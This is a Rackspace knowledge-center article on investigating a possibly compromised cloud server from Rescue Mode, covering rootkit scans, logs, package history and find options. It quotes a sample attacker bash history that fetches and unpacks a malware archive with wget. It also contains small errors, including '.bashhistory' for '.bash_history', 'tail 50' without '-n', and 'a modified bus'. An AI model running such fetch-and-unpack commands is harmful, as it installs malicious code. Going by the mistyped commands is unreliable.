---
node_id: 3437
title: 'Checking for a Security Compromise: Rescue Mode Investigation'
type: article
created_date: '2013-04-26'
created_by: Rose Contreras
last_modified_date: '2013-12-04'
last_modified_by: Jered Heeschen
product: Cloud Servers
product_url: cloud-servers
---

In the previous article, [Checking for a Security Compromise: Back Doors
and
Intruders](/knowledge_center/article/checking-for-a-security-compromise-backdoors-and-intruders),
we covered some basic techniques to collect the necessary information
for tracking intruders. In this second part of **Security Checks During
a Possible Compromise**, we will discuss using the [Cloud Control
Panel's](https://mycloud.rackspace.com/) **Rescue Mode** to take a
closer look at your system.

### Introduction

We cannot trust binaries on a compromised cloud server since they can be
trojaned by attackers. Fortunately the [Cloud Control
Panel](https://mycloud.rackspace.com/) provides us with a Rescue Mode to
help troubleshoot these issues. We can use Rescue Mode to better
understand how our server was compromised and to identify
non-compromised files before backing up the data.

### Rescue Mode

We cannot rely on our cloud server's operating system since it might be
compromised as well. The attacker could have trojaned binaries such as
'ls,' 'find,' and 'netstat,' so their output could mislead you.
Consequently, we must use a different operating system environment to
safely investigate the compromise. This can be done by using the Rescue
Mode feature provided in the [Cloud Control
Panel](https://mycloud.rackspace.com/). Refer to [Rackspace Cloud
Essentials 3 - Rescue Mode on Linux Cloud
Servers](/knowledge_center/article/rackspace-cloud-essentials-3-rescue-mode-on-linux-cloud-servers-1) for
more information.

### Scanning rootkits: chkrootkit and rkhunter

We recommend you install the following tools to scan your files. The
articles linked below will guide your rootkit installation:

#### [Scanning for Rootkits with chkrootkit](/knowledge_center/article/scanning-for-rootkits-with-chkrootkit)

We recommend installing chkrootkit using your package manager rather
than compiling from source.

    apt-get install chkrootkit

We need to run chkrootkit against the mounted file system of the normal
cloud server:

    chkrootkit -r /mnt/demo

#### [Scanning for Rootkits with rkhunter](/knowledge_center/article/scanning-for-rootkits-with-rkhunter)

After you install rkhunter following this article, you can run it
against /mnt/demo.

    rkhunter -c -r /mnt/demo

### Checking Last Commands

It is important to check what users ran before the cloud server was
compromised. This can give us an idea of how the cloud server security
was breached.

The **.bashhistory** file contains the last commands used with the bash
shell. We need to check .bashhistory files in each users' home
directories. The most important .bashhistory file is the one belonging
to root: /root/.bashhistory.

A compromised cloud server may have entries like the following:

    wget http://malware.tar.gz
    gunzip malware.tar.gz
    tar xf malware.tar

### Checking Installed Packages

All changes to the packaging system are stored in /var/log/dpkg.log on
Debian-based distributions.

    tail 50 /mnt/demo/var/log/dpkg.log

This file will show the last 50 lines of the dpkg.log file. We should
check this file for any suspicious activity like installed or removed
packages, or a modified bus.

### Find Command

The 'find' command is usually used to find filenames with specific
patterns; however, we can also use it to find the files
modified/accessed within a specific time period.

For example, we can find all files in /etc owned by root that have been
modified within the last two days:

    find /mnt/demo/etc -user root -mtime -2

Our available options are:

    -atime: when the file was last accessed
    -ctime: when the file's permissions were last changed
    -mtime: when the file's data was last modified

Note that there is a minus sign in front of '2' in the last example. The
'time' options for the find command are expressed in 24-hour increments,
and the sign in front of the number can indicate 'less than' or 'greater
than'. Thus '-2' means we want to find files which were modified within
the last two days. If we want to find files that were modified more than
2 days ago, we would need to put a plus sign in front of the 2:

    find /mnt/demo/etc -user root -mtime +2

There are also versions of the atime, ctime, and mtime arguments that
measure time in minutes:

    -amin: when (in minutes) the file was last accessed
    -cmin: when (in minutes) the file's permissions were last changed
    -mmin: when (in minutes) the file's data was last modified

#### Example:

We will now find all files in our cloud server owned by the demo user
that have been accessed within the last five minutes:

    find /mnt/demo -user demo -amin -5

The following list of find command options might be useful during the
compromised cloud server investigation:

    -nouser: shows output not associated with an existing userid
    -nogroup: shows output not associated with an existing groupid
    -links n: file has n links
    -newer file: file was modified more recently than file
    -perm mode: file has mode permissions

### Checking Logs and Suspicious files

We can find the culprit by checking the following:

-   suspicious files in /tmp, /var/tmp, /dev/shm, /var/spool/samba,
    /var/spool/squid, and /var/spool/cron.
-   We can also look at log files in the following directory:

        /var/log directory

    For example, auth.log records user logon information including their
    IP address.

### Summary

In the previous article, [Security Checks for a Possible Compromise:
Backdoors and
Intruders](/knowledge_center/article/checking-for-a-security-compromise-backdoors-and-intruders),
we learned some techniques we can use to discover backdoors and track
intruders on our cloud server. This will help us avoid the situation or
mistake that led to the compromise, thus minimizing future chances of
getting hacked again in the same way. In this article we learned how to
investigate our cloud server in rescue mode.

Whether it be due to to viruses, file corruption, machine failure, or
other unforeseen mishaps, the possibility of data loss is real. In order
to avoid the disruption such a loss can cause, make it a regular
practice to back up your files regularly. Below are some excellent
options to help you secure your files:

-   [Rackspace Cloud Backup](http://www.rackspace.com/cloud/backup/) is
    a good alternative for Cloud Servers customers. It is fully
    integrated with Cloud Servers, and is a file-based backup
    alternative to whole image server backup.
-   For those who prefer to do it themselves - [Backing Up Your Flles
    with
    rsync](/knowledge_center/article/backing-up-your-files-with-rsync).


